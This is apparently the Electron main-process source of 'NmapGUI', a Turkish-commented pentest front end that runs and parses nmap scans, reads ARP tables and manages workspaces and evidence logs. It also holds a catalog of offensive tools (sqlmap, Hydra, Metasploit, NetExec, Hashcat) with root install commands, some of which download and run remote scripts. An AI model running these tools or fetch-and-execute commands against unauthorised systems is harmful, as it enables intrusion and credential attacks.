const { app, BrowserWindow, ipcMain, shell, dialog, Notification, desktopCapturer, Menu, Tray, nativeImage, safeStorage } = require('electron');
const dns = require('dns').promises;
const path = require('path');
const fs = require('fs');
const os = require('os');
const https = require('https');
const { spawn, execFile, exec } = require('child_process');
const crypto = require('crypto');
const { XMLParser } = require('fast-xml-parser');
const db = require('./db');
const portable = require('./portable');

const NMAP_INSTALLER_URL = 'https://nmap.org/dist/nmap-7.95-setup.exe';

// ---------------- Platform soyutlaması (çoklu-OS) ----------------
const IS_WIN = process.platform === 'win32';
const IS_MAC = process.platform === 'darwin';
const IS_LINUX = process.platform === 'linux';

// Bir pentest aracını platforma göre çalıştırılacak {cmd, args} biçimine çevir.
// Öncelik:  (1) portable binary kurulu mu? → direkt exe
//           (2) Windows → WSL içinde (gerekirse root)
//           (3) Linux/macOS → yerel binary (root gerekiyorsa sudo)
function toolProc(tool, toolArgs, { root = false } = {}) {
  const pbin = portable.binPath(tool);
  if (pbin) return { cmd: pbin, args: toolArgs, kind: 'portable' };
  if (IS_WIN) {
    const pre = root ? ['-u', 'root', '--'] : ['--'];
    return { cmd: 'wsl.exe', args: [...pre, tool, ...toolArgs], kind: 'wsl' };
  }
  if (root && process.getuid && process.getuid() !== 0) {
    return { cmd: 'sudo', args: ['-n', tool, ...toolArgs], kind: 'sudo' };
  }
  return { cmd: tool, args: toolArgs, kind: 'native' };
}

// CVSS skorundan kaba severity (NVD severity boş gelirse).
function sevFromScore(s) {
  if (s == null) return 'unknown';
  if (s >= 9) return 'critical';
  if (s >= 7) return 'high';
  if (s >= 4) return 'medium';
  if (s > 0) return 'low';
  return 'info';
}

let mainWindow;
let tray = null;
let isQuitting = false;
let currentScan = null;
const schedules = {}; // id -> intervalHandle

// --- Depolama yolları ---
const dataDir = () => app.getPath('userData');
const historyDir = () => path.join(dataDir(), 'history');
const settingsFile = () => path.join(dataDir(), 'settings.json');
const logFile = () => path.join(dataDir(), 'nmapgui.log');

function ensureDirs() {
  try { fs.mkdirSync(historyDir(), { recursive: true }); } catch (e) {}
}

// ---------------- Otomatik kanıt (transcript) ----------------
// Tarama/araç çıktısını workspace evidence klasörüne .log olarak yazar, DB'ye kayıt ekler.
// Ayarlardaki autoEvidence kapalıysa devre dışı.
function autoEvidenceEnabled() {
  try { return JSON.parse(fs.readFileSync(settingsFile(), 'utf8')).autoEvidence !== false; }
  catch (e) { return true; }
}
function sanitizeFsPart(s) {
  return String(s || '').replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 60) || 'x';
}
function writeAutoEvidence({ tool, target, hostIp, command, output, exitCode }) {
  if (!autoEvidenceEnabled()) return null;
  let ws;
  try { ws = db.getActiveWorkspace(); } catch (e) { return null; }
  if (!ws) return null;
  try {
    const dir = path.join(dataDir(), 'evidence', `ws-${ws.id}`);
    fs.mkdirSync(dir, { recursive: true });
    const ts = new Date().toISOString().replace(/[:.]/g, '-');
    const file = path.join(dir, `${ts}-${sanitizeFsPart(tool)}-${sanitizeFsPart(target)}.log`);
    const header =
      `# NmapGUI auto-evidence\n` +
      `# tool: ${tool}\n# target: ${target || ''}\n# command: ${command || ''}\n` +
      `# workspace: ${ws.name} (id=${ws.id}, mode=${ws.mode})\n# scope: ${ws.scope || '-'}\n` +
      `# started: ${ts}\n# exit_code: ${exitCode == null ? '?' : exitCode}\n` +
      `# ---------------------------------------------------------------\n`;
    fs.writeFileSync(file, header + (output || ''));
    const label = `${tool} → ${target || hostIp || '-'}`;
    db.addEvidence(ws.id, hostIp || '', 'log', label, file);
    return file;
  } catch (e) { log('auto-evidence yazım hatası: ' + e); return null; }
}
function log(msg) {
  try {
    fs.appendFileSync(logFile(), `[${new Date().toISOString()}] ${msg}\n`);
  } catch (e) {}
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1280, height: 820, minWidth: 980, minHeight: 640,
    title: 'NmapGUI',
    icon: path.join(__dirname, '..', '..', 'assets', 'icon.png'),
    frame: false,
    show: false,                 // ready-to-show'da göster — gri flash önleyici
    backgroundColor: '#0e0e11',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
    },
  });
  mainWindow.loadFile(path.join(__dirname, '..', 'renderer', 'index.html'));
  // ready-to-show: ilk frame hazır olunca maximize + show — flash önleyici
  mainWindow.once('ready-to-show', () => {
    try { mainWindow.maximize(); } catch (_) {}
    mainWindow.show();
  });

  // Küçültünce görev çubuğundan da gizle, sistem tepsisinde dur.
  mainWindow.on('minimize', (e) => {
    e.preventDefault();
    mainWindow.hide();
    ensureTray();
  });
  // Kapatma X'i de tepsiye gönderir; gerçek çıkış için tepsi menüsünden "Çıkış".
  mainWindow.on('close', (e) => {
    if (!isQuitting) {
      e.preventDefault();
      mainWindow.hide();
      ensureTray();
    }
  });
}

function ensureTray() {
  if (tray) return;
  const iconPath = path.join(__dirname, '..', '..', 'assets', 'icon.png');
  let img = nativeImage.createFromPath(iconPath);
  if (!img.isEmpty()) img = img.resize({ width: 16, height: 16 });
  tray = new Tray(img.isEmpty() ? nativeImage.createEmpty() : img);
  tray.setToolTip('NmapGUI');
  tray.setContextMenu(Menu.buildFromTemplate([
    { label: 'NmapGUI\'yi göster', click: () => showFromTray() },
    { type: 'separator' },
    { label: 'Çıkış', click: () => { isQuitting = true; app.quit(); } },
  ]));
  tray.on('click', () => showFromTray());
  tray.on('double-click', () => showFromTray());
}
function showFromTray() {
  if (!mainWindow) return;
  if (mainWindow.isMinimized()) mainWindow.restore();
  mainWindow.show();
  mainWindow.focus();
}

// Yerel menü çubuğunu ("File Edit View...") kaldır
Menu.setApplicationMenu(null);

// Pencere kontrolleri
ipcMain.handle('win:minimize', () => { if (mainWindow) mainWindow.minimize(); });
ipcMain.handle('win:maximize', () => {
  if (!mainWindow) return false;
  if (mainWindow.isMaximized()) { mainWindow.unmaximize(); return false; }
  mainWindow.maximize(); return true;
});
ipcMain.handle('win:close', () => { if (mainWindow) mainWindow.close(); });
ipcMain.handle('win:isMaximized', () => mainWindow ? mainWindow.isMaximized() : false);

// DB ve portable'ı arka planda başlat — pencere bunları beklemez.
// IPC handler'ları db'ye dokunmadan önce dbReady promise'ini bekler.
let dbReady;
function startBackgroundInit() {
  portable.init(dataDir());
  dbReady = db.initDb(dataDir())
    .then(() => { log('Veritabanı hazır.'); if (mainWindow) mainWindow.webContents.send('db:ready'); })
    .catch((e) => { log('DB init hatası: ' + e); });
}

app.whenReady().then(() => {
  ensureDirs();
  log('Uygulama başlatıldı.');
  // 1) Pencereyi hemen aç — DB beklemez
  createWindow();
  // 2) DB + portable arka planda yüklenir
  startBackgroundInit();
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

// Pencere tepsiye gizlenebildiği için 'window-all-closed' tetiklenmez. Yine de
// kullanıcı explicit "Çıkış" dediğinde temizlik yapalım.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin' && isQuitting) app.quit();
});
app.on('before-quit', () => { isQuitting = true; });

// ---------------- nmap ----------------
ipcMain.handle('nmap:check', async () => {
  return new Promise((resolve) => {
    execFile('nmap', ['--version'], (err, stdout) => {
      if (err) return resolve({ installed: false });
      const out = stdout || '';
      const verMatch = out.match(/version\s+([\d.]+)/i);
      resolve({ installed: true, version: out.split('\n')[0].trim(), number: verMatch ? verMatch[1] : '' });
    });
  });
});

ipcMain.handle('nmap:openDownload', async () => {
  await shell.openExternal('https://nmap.org/download.html');
  return true;
});

ipcMain.handle('nmap:install', async () => {
  const dest = path.join(os.tmpdir(), 'nmap-setup.exe');
  try {
    await downloadFile(NMAP_INSTALLER_URL, dest, (pct) =>
      mainWindow.webContents.send('nmap:downloadProgress', pct));
  } catch (e) {
    log('nmap indirme hatası: ' + e);
    await shell.openExternal('https://nmap.org/download.html');
    return { ok: false, error: 'İndirme başarısız, sayfa açıldı: ' + String(e) };
  }
  try { shell.openPath(dest); return { ok: true }; }
  catch (e) { return { ok: false, error: String(e) }; }
});

// ---------------- Ağ / yetki ----------------
ipcMain.handle('net:localRange', async () => {
  const ifaces = os.networkInterfaces();
  for (const name of Object.keys(ifaces)) {
    for (const net of ifaces[name] || []) {
      if (net.family === 'IPv4' && !net.internal) {
        const parts = net.address.split('.');
        const cidr = `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
        const gateway = `${parts[0]}.${parts[1]}.${parts[2]}.1`;
        return { ok: true, ip: net.address, cidr, gateway, iface: name };
      }
    }
  }
  return { ok: false, error: 'Aktif ağ arayüzü bulunamadı.' };
});

// Yönetici/root yetkisi kontrolü (platforma göre).
ipcMain.handle('admin:check', async () => {
  return new Promise((resolve) => {
    if (IS_WIN) return exec('net session', { windowsHide: true }, (err) => resolve({ admin: !err }));
    // Linux/macOS: efektif kullanıcı root mu?
    resolve({ admin: !!(process.getuid && process.getuid() === 0) });
  });
});

// Uygulamayı yönetici olarak yeniden başlat (UAC).
ipcMain.handle('admin:relaunch', async () => {
  if (process.platform !== 'win32') return { ok: false };
  const exePath = process.execPath;
  const psCmd = `Start-Process -FilePath '${exePath}' -Verb RunAs`;
  exec(`powershell -Command "${psCmd}"`, (err) => {
    if (!err) { app.quit(); }
  });
  return { ok: true };
});

// Yaygın MAC OUI -> üretici eşlemesi (arp-only girişler için kaba tahmin).
const OUI_MAP = {
  '00:1a:11': 'Google', '3c:5a:b4': 'Google', 'f4:f5:e8': 'Google',
  '00:25:00': 'Apple', 'a4:5e:60': 'Apple', 'f0:18:98': 'Apple', 'dc:a9:04': 'Apple', '3c:15:c2': 'Apple',
  'b8:27:eb': 'Raspberry Pi', 'dc:a6:32': 'Raspberry Pi', 'e4:5f:01': 'Raspberry Pi',
  '00:50:56': 'VMware', '00:0c:29': 'VMware', '08:00:27': 'VirtualBox',
  '00:1d:7e': 'Cisco-Linksys', 'c0:56:27': 'Belkin', '00:18:e7': 'Cameo/Netgear',
  '50:c7:bf': 'TP-Link', 'a4:2b:b0': 'TP-Link', 'd8:0d:17': 'TP-Link', 'ec:08:6b': 'TP-Link',
  '00:24:01': 'D-Link', '14:d6:4d': 'D-Link', '00:1f:3f': 'AVM/Fritz',
  'fc:ec:da': 'Ubiquiti', '24:a4:3c': 'Ubiquiti', '00:15:6d': 'Ubiquiti',
  '00:09:0f': 'Fortinet', '00:e0:4c': 'Realtek', '52:54:00': 'QEMU/KVM',
  '00:1b:63': 'Apple', 'ac:de:48': 'Apple', '78:4f:43': 'Apple',
  'd0:50:99': 'ASRock/ASUS', '1c:87:2c': 'ASUS', '04:d4:c4': 'ASUS',
  '00:11:32': 'Synology', '00:1c:c0': 'Intel', '94:c6:91': 'Elitegroup',
  '00:50:f2': 'Microsoft', '00:15:5d': 'Microsoft Hyper-V',
};
function vendorFromMac(mac) {
  if (!mac) return '';
  const oui = mac.toLowerCase().slice(0, 8);
  return OUI_MAP[oui] || '';
}

// ARP/komşu tablosunu oku -> [{ ip, mac }] (platforma göre).
// Windows: "arp -a" (MAC tireli), Linux: "ip neigh" (yoksa arp -n), macOS: "arp -a" (MAC iki nokta).
function readArpTable() {
  const cmd = IS_WIN ? 'arp -a' : (IS_LINUX ? 'ip neigh' : 'arp -an');
  return new Promise((resolve) => {
    exec(cmd, { windowsHide: true }, (err, stdout) => {
      if (err) {
        // Linux'ta ip yoksa arp -n'e düş
        if (IS_LINUX) return exec('arp -n', { windowsHide: true }, (e2, out2) => resolve(parseArp(out2 || '')));
        return resolve([]);
      }
      resolve(parseArp(stdout || ''));
    });
  });
}
function parseArp(stdout) {
  const entries = [];
  const accept = (ip, macRaw) => {
    const mac = macRaw.replace(/-/g, ':').toLowerCase();
    if (!/^[0-9a-f]{2}(:[0-9a-f]{2}){5}$/.test(mac)) return;
    if (mac === 'ff:ff:ff:ff:ff:ff' || /^(01:00:5e|33:33)/.test(mac)) return;
    if (ip.endsWith('.255') || ip.startsWith('224.') || ip.startsWith('239.')) return;
    entries.push({ ip, mac });
  };
  stdout.split('\n').forEach((line) => {
    // Windows: "  192.168.0.1   00-11-22-33-44-55   dynamic"
    let m = line.match(/^\s*([\d.]+)\s+([0-9a-fA-F]{2}([-:])[0-9a-fA-F]{2}(?:\3[0-9a-fA-F]{2}){4})\s/);
    if (m) return accept(m[1], m[2]);
    // Linux "ip neigh": "192.168.0.1 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE"
    m = line.match(/^([\d.]+)\s.*lladdr\s+([0-9a-fA-F:]{17})/);
    if (m) return accept(m[1], m[2]);
    // macOS/BSD "arp -an": "? (192.168.0.1) at 0:11:22:33:44:55 on en0"
    m = line.match(/\(([\d.]+)\)\s+at\s+([0-9a-fA-F:]+)/);
    if (m) {
      // macOS tek haneli oktetleri sıfırla doldur (0:11 -> 00:11)
      const mac = m[2].split(':').map((x) => x.padStart(2, '0')).join(':');
      return accept(m[1], mac);
    }
  });
  return entries;
}

// nmap sonucuna ARP tablosunu birleştir (her şeyi bul: nmap'in kaçırdığı IP/MAC dahil).
async function mergeArp(parsed) {
  const arp = await readArpTable();
  const byIp = {};
  parsed.hosts.forEach((h) => { byIp[h.ip] = h; });
  arp.forEach((e) => {
    if (byIp[e.ip]) {
      // Var olan host'a MAC/üretici tamamla
      if (!byIp[e.ip].mac) byIp[e.ip].mac = e.mac;
      if (!byIp[e.ip].vendor) byIp[e.ip].vendor = vendorFromMac(e.mac);
    } else {
      // nmap kaçırdı ama ARP biliyor -> yeni host ekle
      const vendor = vendorFromMac(e.mac);
      parsed.hosts.push({
        ip: e.ip, name: '', mac: e.mac, vendor, status: 'up', latency: '',
        ports: [], osGuess: '', osAccuracy: '', vulns: [],
        deviceType: guessDeviceType(vendor, []), source: 'arp',
      });
    }
  });
  return parsed;
}

// ---------------- Tarama ----------------
ipcMain.handle('scan:start', async (event, args) => {
  if (currentScan) return { ok: false, error: 'Zaten çalışan bir tarama var.' };
  const xmlPath = path.join(os.tmpdir(), `nmapgui-${Date.now()}.xml`);
  const argArr = Array.isArray(args) ? args : [];
  const isDiscovery = argArr.includes('-sn');
  const scanMeta = { target: argArr[argArr.length - 1] || '', command: 'nmap ' + argArr.join(' ') };
  // İlerleme + XML çıktısı için bayraklar ekle.
  const nmapArgs = ['--stats-every', '2s', '-v', '-oX', xmlPath, ...argArr];

  try {
    currentScan = spawn('nmap', nmapArgs, { windowsHide: true });
  } catch (e) {
    currentScan = null;
    return { ok: false, error: String(e) };
  }
  log('Tarama: nmap ' + nmapArgs.join(' '));

  let scanBuf = '';
  const MAX_BUF = 2 * 1024 * 1024;
  const appendBuf = (s) => { if (scanBuf.length < MAX_BUF) scanBuf += s; };
  currentScan.stdout.on('data', (d) => { const s = d.toString(); appendBuf(s); mainWindow.webContents.send('scan:stdout', s); });
  currentScan.stderr.on('data', (d) => {
    const s = d.toString();
    appendBuf(s);
    mainWindow.webContents.send('scan:stderr', s);
    const m = s.match(/About\s+([\d.]+)%\s+done/i);
    if (m) mainWindow.webContents.send('scan:progress', parseFloat(m[1]));
  });
  currentScan.on('close', async (code) => {
    let parsed = { hosts: [] };
    try {
      if (fs.existsSync(xmlPath)) {
        parsed = parseNmapXml(fs.readFileSync(xmlPath, 'utf8'));
        fs.unlink(xmlPath, () => {});
      }
    } catch (e) { log('XML parse hatası: ' + e); }
    // Keşif taramalarında ARP tablosuyla birleştir (her şeyi bul + MAC).
    try {
      if (isDiscovery) parsed = await mergeArp(parsed);
      // Üretici boşsa OUI'den tamamla
      parsed.hosts.forEach((h) => { if (h.mac && !h.vendor) h.vendor = vendorFromMac(h.mac); });
    } catch (e) { log('ARP birleştirme hatası: ' + e); }
    // Aktif workspace'e (asset graph) yaz
    try {
      const ws = db.getActiveWorkspace();
      if (ws) db.persistScan(ws.id, { target: scanMeta.target, command: scanMeta.command, parsed });
    } catch (e) { log('persistScan hatası: ' + e); }
    try {
      writeAutoEvidence({ tool: 'nmap', target: scanMeta.target, command: scanMeta.command,
                          output: scanBuf, exitCode: code });
    } catch (e) { log('auto-evidence (nmap) hatası: ' + e); }
    mainWindow.webContents.send('scan:done', { code, parsed });
    currentScan = null;
  });
  currentScan.on('error', (err) => {
    mainWindow.webContents.send('scan:error', String(err));
    currentScan = null;
  });

  return { ok: true, command: 'nmap ' + (Array.isArray(args) ? args.join(' ') : '') };
});

ipcMain.handle('scan:stop', async () => {
  if (currentScan) { currentScan.kill(); currentScan = null; return { ok: true }; }
  return { ok: false, error: 'Çalışan tarama yok.' };
});

// nmap XML -> yapısal model
function parseNmapXml(xml) {
  const parser = new XMLParser({ ignoreAttributes: false, attributeNamePrefix: '@_' });
  const doc = parser.parse(xml);
  const run = doc.nmaprun || {};
  let rawHosts = run.host || [];
  if (!Array.isArray(rawHosts)) rawHosts = [rawHosts];

  const hosts = rawHosts.map((h) => {
    const addrs = Array.isArray(h.address) ? h.address : (h.address ? [h.address] : []);
    let ip = '', mac = '', vendor = '';
    addrs.forEach((a) => {
      if (a['@_addrtype'] === 'ipv4') ip = a['@_addr'];
      if (a['@_addrtype'] === 'mac') { mac = a['@_addr']; vendor = a['@_vendor'] || ''; }
    });
    let name = '';
    if (h.hostnames && h.hostnames.hostname) {
      const hn = h.hostnames.hostname;
      name = (Array.isArray(hn) ? hn[0] : hn)['@_name'] || '';
    }
    const status = h.status ? h.status['@_state'] : 'unknown';
    const latency = h.times ? '' : '';

    // Portlar
    let ports = [];
    if (h.ports && h.ports.port) {
      let pl = h.ports.port;
      if (!Array.isArray(pl)) pl = [pl];
      ports = pl.map((p) => {
        let scripts = [];
        if (p.script) {
          let sl = Array.isArray(p.script) ? p.script : [p.script];
          scripts = sl.map((s) => ({ id: s['@_id'], output: s['@_output'] || '' }));
        }
        const svc = p.service || {};
        return {
          port: String(p['@_portid']), proto: p['@_protocol'],
          state: p.state ? p.state['@_state'] : '',
          reason: p.state ? p.state['@_reason'] : '',
          service: svc['@_name'] || '',
          product: svc['@_product'] || '',
          version: [svc['@_product'], svc['@_version']].filter(Boolean).join(' '),
          scripts,
        };
      });
    }

    // OS tahmini
    let osGuess = '', osAccuracy = '';
    if (h.os && h.os.osmatch) {
      const om = Array.isArray(h.os.osmatch) ? h.os.osmatch[0] : h.os.osmatch;
      osGuess = om['@_name'] || ''; osAccuracy = om['@_accuracy'] || '';
    }

    // Zafiyet/CVE tespiti (script çıktılarından)
    const vulns = [];
    ports.forEach((p) => p.scripts.forEach((s) => {
      const cves = (s.output.match(/CVE-\d{4}-\d+/g) || []);
      cves.forEach((cve) => vulns.push({ port: p.port, cve, script: s.id }));
    }));

    return { ip, name, mac, vendor, status, latency, ports, osGuess, osAccuracy, vulns,
             deviceType: guessDeviceType(vendor, ports) };
  });

  return { hosts, summary: run.runstats ? run.runstats.finished : null };
}

// Üretici + portlardan cihaz türü tahmini
function guessDeviceType(vendor, ports) {
  const v = (vendor || '').toLowerCase();
  const svc = ports.map((p) => p.service).join(' ');
  if (/tp-link|netgear|asus|cisco|mikrotik|ubiquiti|huawei|zyxel/.test(v)) return 'router';
  if (/apple|samsung|xiaomi|oneplus|google|huawei/.test(v)) return 'phone';
  if (/hp|canon|epson|brother|lexmark/.test(v) || /ipp|printer/.test(svc)) return 'printer';
  if (/hikvision|dahua|axis|reolink/.test(v) || /rtsp/.test(svc)) return 'camera';
  if (/raspberry|intel|dell|microsoft/.test(v)) return 'computer';
  return 'unknown';
}

// ---------------- PDF rapor ----------------
ipcMain.handle('report:savePdf', async (event, html) => {
  const { canceled, filePath } = await dialog.showSaveDialog(mainWindow, {
    title: 'PDF Raporu Kaydet',
    defaultPath: `nmap-rapor-${Date.now()}.pdf`,
    filters: [{ name: 'PDF', extensions: ['pdf'] }],
  });
  if (canceled || !filePath) return { ok: false, error: 'iptal' };
  const pdfWin = new BrowserWindow({ show: false, webPreferences: { sandbox: true } });
  try {
    await pdfWin.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(html));
    const data = await pdfWin.webContents.printToPDF({ printBackground: true, pageSize: 'A4' });
    fs.writeFileSync(filePath, data);
    return { ok: true, path: filePath };
  } catch (e) { return { ok: false, error: String(e) }; }
  finally { pdfWin.destroy(); }
});

// ---------------- Geçmiş (JSON dosya tabanlı) ----------------
ipcMain.handle('history:save', async (event, record) => {
  ensureDirs();
  const id = 'scan-' + Date.now();
  const file = path.join(historyDir(), id + '.json');
  fs.writeFileSync(file, JSON.stringify({ id, ...record }, null, 2));
  return { ok: true, id };
});
ipcMain.handle('history:list', async () => {
  ensureDirs();
  const files = fs.readdirSync(historyDir()).filter((f) => f.endsWith('.json'));
  const items = files.map((f) => {
    try {
      const d = JSON.parse(fs.readFileSync(path.join(historyDir(), f), 'utf8'));
      return { id: d.id, date: d.date, target: d.target, command: d.command,
               deviceCount: (d.parsed?.hosts || []).filter((h) => h.status === 'up').length,
               portCount: (d.parsed?.hosts || []).reduce((a, h) => a + (h.ports || []).length, 0) };
    } catch (e) { return null; }
  }).filter(Boolean);
  items.sort((a, b) => (b.date || '').localeCompare(a.date || ''));
  return items;
});
ipcMain.handle('history:get', async (event, id) => {
  const file = path.join(historyDir(), id + '.json');
  if (!fs.existsSync(file)) return null;
  return JSON.parse(fs.readFileSync(file, 'utf8'));
});
ipcMain.handle('history:delete', async (event, id) => {
  const file = path.join(historyDir(), id + '.json');
  if (fs.existsSync(file)) fs.unlinkSync(file);
  return { ok: true };
});

// ---------------- Ayarlar ----------------
ipcMain.handle('settings:get', async () => {
  try { return JSON.parse(fs.readFileSync(settingsFile(), 'utf8')); }
  catch (e) { return { lang: 'tr', theme: 'dark', safeMode: true, timing: 'T4' }; }
});
ipcMain.handle('settings:save', async (event, s) => {
  fs.writeFileSync(settingsFile(), JSON.stringify(s, null, 2));
  return { ok: true };
});

// ---------------- Bildirim ----------------
ipcMain.handle('notify', async (event, { title, body }) => {
  try { new Notification({ title, body }).show(); } catch (e) {}
  return { ok: true };
});

// DB'ye dokunmadan önce hazır olduğundan emin ol.
async function waitDb() { try { if (dbReady) await dbReady; } catch (_) {} }

// ---------------- Workspace / Engagement ----------------
ipcMain.handle('ws:list', async () => { await waitDb(); return db.listWorkspaces(); });
ipcMain.handle('ws:active', async () => { await waitDb(); return db.getActiveWorkspace(); });
ipcMain.handle('ws:create', async (e, { name, mode, scope }) => db.createWorkspace(name, mode, scope));
ipcMain.handle('ws:setActive', async (e, id) => db.setActiveWorkspace(id));
ipcMain.handle('ws:update', async (e, { id, fields }) => db.updateWorkspace(id, fields));
ipcMain.handle('ws:delete', async (e, id) => db.deleteWorkspace(id));
ipcMain.handle('ws:assets', async (e, id) => db.workspaceAssets(id));
ipcMain.handle('ws:audit', async (e, id) => db.listAudit(id));
ipcMain.handle('ws:logAudit', async (e, { ws, action, detail }) => { db.addAudit(ws, action, detail); return true; });

// ---------------- Finding triyaj (Faz 1) ----------------
ipcMain.handle('findings:list', async (e, wsId) => {
  const id = wsId || (db.getActiveWorkspace() && db.getActiveWorkspace().id);
  if (!id) return [];
  return db.listFindings(id);
});
ipcMain.handle('findings:update', async (e, { id, fields }) => db.updateFinding(id, fields || {}));
ipcMain.handle('findings:delete', async (e, id) => db.deleteFinding(id));
ipcMain.handle('findings:statuses', async () => db.FINDING_STATUSES);

// ---------------- WSL2 / pentest araç tespiti ----------------
ipcMain.handle('wsl:check', async () => {
  return new Promise((resolve) => {
    if (process.platform !== 'win32') return resolve({ installed: false, reason: 'sadece Windows' });
    exec('wsl.exe -l -q', { windowsHide: true, encoding: 'utf16le' }, (err, stdout) => {
      if (err) return resolve({ installed: false });
      const distros = (stdout || '').split('\n').map((s) => s.trim()).filter(Boolean);
      resolve({ installed: distros.length > 0, distros });
    });
  });
});

// WSL içindeki bir aracın kurulu olup olmadığını kontrol et (which <tool>)
ipcMain.handle('wsl:tool', async (e, tool) => {
  return new Promise((resolve) => {
    if (process.platform !== 'win32') return resolve({ found: false });
    if (!/^[a-z0-9_-]+$/i.test(tool)) return resolve({ found: false });
    exec(`wsl.exe -- which ${tool}`, { windowsHide: true }, (err, stdout) => {
      resolve({ found: !err && !!(stdout || '').trim(), path: (stdout || '').trim() });
    });
  });
});

// nuclei'yi GitHub'dan hazır binary ile kur (Go derlemesi gerektirmez).
const NUCLEI_INSTALL =
  "apt-get update && apt-get install -y curl unzip >/dev/null 2>&1; " +
  "URL=$(curl -s https://api.github.com/repos/projectdiscovery/nuclei/releases/latest | grep -o 'https://[^\"]*linux_amd64.zip' | head -1); " +
  "echo \"İndiriliyor: $URL\"; curl -sL \"$URL\" -o /tmp/nuclei.zip && unzip -o /tmp/nuclei.zip -d /usr/local/bin/ nuclei && chmod +x /usr/local/bin/nuclei && nuclei -version";

// Pentest araç kataloğu — phase: 'recon'|'enum'|'exploit'|'post' (kill-chain kanban için).
const TOOL_CATALOG = [
  // RECON
  { id: 'nmap', name: 'Nmap', desc: 'Port/servis tarayıcı (Windows-doğal)', cat: 'Keşif', phase: 'recon', builtIn: true, install: '' },
  { id: 'naabu', name: 'Naabu', desc: 'Hızlı port tarayıcı (Go, portable)', cat: 'Keşif', phase: 'recon',
    install: 'apt-get update && apt-get install -y naabu' },
  { id: 'masscan', name: 'Masscan', desc: 'Çok hızlı port tarayıcı (büyük ağlar)', cat: 'Keşif', phase: 'recon',
    install: 'apt-get update && apt-get install -y masscan' },
  { id: 'subfinder', name: 'Subfinder', desc: 'Subdomain enumerasyonu (portable)', cat: 'Keşif', phase: 'recon',
    install: 'apt-get update && apt-get install -y subfinder' },
  { id: 'amass', name: 'Amass', desc: 'OWASP derinlemesine recon (portable)', cat: 'Keşif', phase: 'recon',
    install: 'apt-get update && apt-get install -y amass' },
  { id: 'dnsx', name: 'dnsx', desc: 'DNS toolkit (portable)', cat: 'Keşif', phase: 'recon',
    install: 'apt-get update && apt-get install -y dnsx' },

  // ENUM
  { id: 'nuclei', name: 'Nuclei', desc: 'Şablon tabanlı zafiyet tarayıcı', cat: 'Zafiyet', phase: 'enum', install: NUCLEI_INSTALL },
  { id: 'httpx', name: 'httpx', desc: 'HTTP probe + tek tıkla tech detect (portable)', cat: 'Web', phase: 'enum',
    install: 'apt-get update && apt-get install -y httpx-toolkit' },
  { id: 'katana', name: 'Katana', desc: 'Modern web crawler (portable)', cat: 'Web', phase: 'enum',
    install: 'apt-get update && apt-get install -y katana' },
  { id: 'gobuster', name: 'Gobuster', desc: 'Web dizin/DNS keşfi (portable)', cat: 'Web', phase: 'enum',
    install: 'apt-get update && apt-get install -y gobuster' },
  { id: 'ffuf', name: 'ffuf', desc: 'Hızlı web fuzzer (portable)', cat: 'Web', phase: 'enum',
    install: 'apt-get update && apt-get install -y ffuf' },
  { id: 'nikto', name: 'Nikto', desc: 'Web sunucu zafiyet tarayıcı', cat: 'Web', phase: 'enum',
    install: 'apt-get update && apt-get install -y nikto' },
  { id: 'whatweb', name: 'WhatWeb', desc: 'Web teknoloji tespiti', cat: 'Web', phase: 'enum',
    install: 'apt-get update && apt-get install -y whatweb' },
  { id: 'enum4linux', name: 'enum4linux-ng', desc: 'SMB/Samba enumerasyonu (modern halefi)', cat: 'Enum', phase: 'enum',
    install: 'apt-get update && apt-get install -y pipx smbclient && pipx ensurepath && pipx install --force enum4linux-ng && ln -sf /root/.local/bin/enum4linux-ng /usr/local/bin/enum4linux-ng && ln -sf /root/.local/bin/enum4linux-ng /usr/local/bin/enum4linux && /usr/local/bin/enum4linux -h | head -1' },

  // EXPLOIT
  { id: 'searchsploit', name: 'SearchSploit', desc: 'ExploitDB exploit araması (salt-okunur)', cat: 'Exploit', phase: 'exploit',
    install: 'apt-get update && apt-get install -y git && (test -d /opt/exploitdb || git clone --depth 1 https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb) && ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit && /usr/local/bin/searchsploit -h | head -1' },
  { id: 'sqlmap', name: 'sqlmap', desc: 'SQL injection otomasyonu (Python, Windows-doğal)', cat: 'Exploit', phase: 'exploit',
    install: 'apt-get update && apt-get install -y sqlmap' },
  { id: 'hydra', name: 'Hydra', desc: 'Kimlik denemesi (yalnızca engagement+scope)', cat: 'Exploit', phase: 'exploit',
    install: 'apt-get update && apt-get install -y hydra' },
  { id: 'msfconsole', name: 'Metasploit', desc: 'Exploit çerçevesi (arama serbest, çalıştırma kapılı)', cat: 'Exploit', phase: 'exploit',
    install: 'apt-get update && apt-get install -y curl && curl -sSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o /tmp/msfinstall && chmod +x /tmp/msfinstall && /tmp/msfinstall' },

  // POST-EXPLOIT
  { id: 'chisel', name: 'Chisel', desc: 'TCP/UDP tünel (portable)', cat: 'Pivot', phase: 'post',
    install: 'apt-get update && apt-get install -y chisel' },
  { id: 'hashcat', name: 'Hashcat', desc: 'Hash kırma (GPU/CPU)', cat: 'Şifre', phase: 'post',
    install: 'apt-get update && apt-get install -y hashcat' },
  { id: 'john', name: 'John the Ripper', desc: 'Klasik şifre kırıcı', cat: 'Şifre', phase: 'post',
    install: 'apt-get update && apt-get install -y john' },
  { id: 'netexec', name: 'NetExec', desc: 'AD/SMB lateral movement (eski CME)', cat: 'AD', phase: 'post',
    install: 'apt-get update && apt-get install -y pipx python3-venv git build-essential libssl-dev libffi-dev libsasl2-dev libldap2-dev krb5-multidev python3-dev && pipx ensurepath && pipx install --force git+https://github.com/Pennyw0rth/NetExec.git && ln -sf /root/.local/bin/netexec /usr/local/bin/netexec 2>/dev/null; ln -sf /root/.local/bin/nxc /usr/local/bin/nxc 2>/dev/null; /usr/local/bin/netexec --version' },
];
ipcMain.handle('tools:catalog', async () => TOOL_CATALOG);

// WSL2'yi otomatik kur — root distro olarak (kullanıcı/şifre sorusu atlanır).
